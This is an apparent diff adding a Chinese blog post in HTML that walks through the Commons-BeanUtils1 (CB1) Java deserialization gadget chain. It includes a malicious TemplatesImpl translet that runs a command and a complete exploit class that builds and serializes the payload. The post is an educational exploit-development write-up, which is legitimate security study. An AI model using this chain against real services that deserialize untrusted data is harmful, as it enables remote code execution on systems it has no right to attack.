@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+    <meta charset="UTF-8">
+    <title>Java反序列化之CB1 - N0tluS.site</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta property="og:site_name" content="N0tluS.site">
+    <meta property="og:title" content="Java反序列化之CB1"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>N0tluS.site</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a href>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>Java反序列化之CB1</h2>
+            <div class="post-meta">
+                <time class="date">2024.09.19</time>
+            
+                <span class="category"><a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>在CC2和CC4这两条针对CommonsColletions4的链子里，我们用到了<code>java.util.PriorityQueue</code>，里面执行了<code>java.util.Comparator</code>接口的<code>compare()</code>方法。我们能不能找到其他可以利用的<code> java.util.Comparator</code>对象呢？</p>
+<h1 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h1><ul>
+<li>jdk8u65</li>
+<li>Maven</li>
+<li>commons-collections3.1</li>
+<li>commons-beanutils1.9.2</li>
+<li>commons-logging1.2</li>
+</ul>
+<h1 id="0x02CommonsBeanUtils简介"><a href="#0x02CommonsBeanUtils简介" class="headerlink" title="0x02CommonsBeanUtils简介"></a>0x02CommonsBeanUtils简介</h1><p>Apache Commons工具集下除了<code>collections</code>以外还有<code>BeanUtils</code>，它主要用于控制<code>JavaBean</code>，有关<code>JavaBean</code>的详细介绍，可以看廖雪峰老师的<a href=https://liaoxuefeng.com/books/java/oop/core/javabean/index.html>文章</a></p>
+<p>比如Cat类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;notlus&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它包含一个私有属性<code>name</code>，我们把一组对应的读方法（<code>getter</code>）和写方法（<code>setter</code>），称为属性（<code>property</code>）。例如：<code>name</code>属性</p>
+<ul>
+<li>对应的读方法是<code>String getName()</code></li>
+<li>对应的写方法是<code>setName(String)</code></li>
+</ul>
+<h2 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a><code>PropertyUtils</code></h2><p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty</code>，让使用者可以直接调用任意JavaBean的getter方法，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line">        String name=(String)PropertyUtils.getProperty(new Cat(),&quot;name&quot;);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时，commons-beanutils会通过<strong>反射</strong>找到name属性的<code>getter</code>方法，也就是<code>getName</code>，然后调用，获得返回值。此外，<code>PropertyUtils.getProperty</code>还支持递归获取属性，比如a对象有属性b，b对象有属性c，就可以通过<code>PropertyUtils.getProperty(a,&quot;b.c&quot;)</code>的方法递归获取属性c</p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918194232592.png" class="" title="image-20240918194232592">
+
+<h1 id="0x02利用链分析"><a href="#0x02利用链分析" class="headerlink" title="0x02利用链分析"></a>0x02利用链分析</h1><h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a><code>BeanComparator</code></h2><p>我们的目的是要找到一个有<code>compare</code>方法的类，而commons-beanutils包就存在一个符合我们要求的类：<code>BeanComparator</code>，它继承了<code>java.utils.Comparator</code>，所以也重写了<code>compare</code>方法</p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918195414260.png" class="" title="image-20240918195414260">
+
+<p>这个方法需要传入两个对象，如果<code>this.property==null</code>，则直接比较对象，否则往下分别过去这两个对象的<code>this.property</code>属性，然后再比较属性的值。</p>
+<p>而里面恰好也调用了<code>getProperty</code>方法，会去调用一个<code>JavaBean</code>的<code>getter</code>方法，那么我们的目的就变成了找到一个里面能够执行恶意代码的<code>getter</code>方法。而<code>TemplatesImpl</code>这个类就是我们需要找的类，我们先回顾一下利用<code>TemplasImpl</code>动态加载字节码的链子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">	TemplatesImpl.newTransformer()</span><br><span class="line">		TemplatesImpl.getTransletInstance()</span><br><span class="line">			TemplatesImpl.defineTransletClasses()</span><br><span class="line">				TransletClassLoade.defineClass()</span><br></pre></td></tr></table></figure>
+
+<p>我们来看一下<code>TemplatesImpl.getOUtputProperties()</code></p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918201500665.png" class="" title="image-20240918201500665">
+
+<p>里面调用了<code>newTransformer()</code>，可以用来加载恶意字节码，而且这个方法本身也符合<code>getter</code>的定义，如果我们往<code>property</code>里面传入<code>outputProperties</code>时，这里就会通过反射调用<code>getter</code>，也就会触发命令执行</p>
+<p>写一个测试demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBeanComparator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF\\Javasec\\classloader\\src\\TemplatesImplDemo\\Calc.class&quot;</span>));</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;notlus&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        BeanComparator beanComparator=<span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        beanComparator.compare(templates,templates);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="再探CC2——PriorityQueue"><a href="#再探CC2——PriorityQueue" class="headerlink" title="再探CC2——PriorityQueue"></a>再探CC2——<code>PriorityQueue</code></h2><p>接下来找入口类，我们需要找到一个调用了<code>compare</code>方法、而且可以被序列化的类作为我们的入口类，所以我们得到在CC2中讲到的<code>java.util.PriorityQueue</code></p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918202827867.png" class="" title="image-20240918202827867">
+
+<p>在反序列化的时候，会调用<code>heapify</code>方法对元素进行调整，确保元素的顺序正确</p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918203038106.png" class="" title="image-20240918203038106">
+
+<p><code>heapify</code>通过<code>siftDown</code>下沉结点，将数组转为堆结构</p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918203327135.png" class="" title="image-20240918203327135">
+
+<p>当<code>comparator</code>不为<code>null</code>时，就会调用<code>siftDownUsingComparator</code>方法，而<code>siftDownUsingComparator</code>里面调用了<code>compare</code>方法</p>
+<img src="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/image-20240918203509319.png" class="" title="image-20240918203509319">
+
+<p>到这里我们就可以连接上前面的<code>BeanComparator</code>方法了，总结一下利用链，这里我写详细一点:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		PriorityQueue.heapify()</span><br><span class="line">			PriorityQueue.siftDown()</span><br><span class="line">				Priority.siftDownUsingComparator()</span><br><span class="line">					BeanComaparator.compare()</span><br><span class="line">						PropertyUtils.getProperty()</span><br><span class="line">							TemplatesImpl.getOutputProperties()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03编写exp"><a href="#0x03编写exp" class="headerlink" title="0x03编写exp"></a>0x03编写exp</h1><p>待加载的字节码这部分比较简单，只是需要注意继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们一步一步来拆解exp，首先就是创建<code>TemplatesImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF\\Javasec\\classloader\\src\\TemplatesImplDemo\\Calc.class&quot;</span>));</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;notlus&quot;</span>);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+
+<p>然后实例化<code>BeanComarator</code>，先调用它空的构造函数，如果这里就把参数传入的话后面，<code>add</code>方法那里会抛出错误。所以后面再通过反射修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator beanComparator=<span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br></pre></td></tr></table></figure>
+
+<p>再然后就是创建队列了，这里我们把<code>beanComparator</code>传进去，因为<code>add</code>方法本身也会触发利用链，我们就先传入两个无用的值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后是利用反射修改属性：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;_outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF\\Javasec\\classloader\\src\\TemplatesImplDemo\\Calc.class&quot;</span>));</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;notlus&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        BeanComparator beanComparator=<span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="comment">//创建队列</span></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);<span class="comment">//队列长度为2，所以需要放入两个</span></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        java.io.FileOutputStream fileOut=<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fileOut);</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        java.io.FileInputStream fileIn=<span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.ObjectInputStream in=<span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fileIn);</span><br><span class="line">        Object obj=in.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h1><p>CB1主要利用的还是Apache Commons Beanutils下的两个类：<code>BeanComparator</code>和<code>PropertyUtils</code>。<code>PropertyUtils.getProperty</code>可以实现可执行危险代码的<code>getter</code>方法进行调用，而<code>BeanComparator.compare</code>就可以完成对<code>PropertyUtils.getProperty</code>的调用，而这个类本身也是一个可以利用的<code> java.util.Comparator</code>对象。多调试多总结……</p>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: 看完啦 (つд⊂)</li>
+                
+                
+                    <li>下一篇: <a href="/2024/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC11/">Java反序列化之CC11</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://gravatar.com/deepestcollectionebe5c8dd66" alt="N0tluS" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>N0tluS</h4>
+                <p>ovo</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <button class="to-top" href="#"></button>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC11/">Java反序列化之CC11</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/">Java反序列化之CC链</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Java安全</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>
+
+  </body>
+</html>
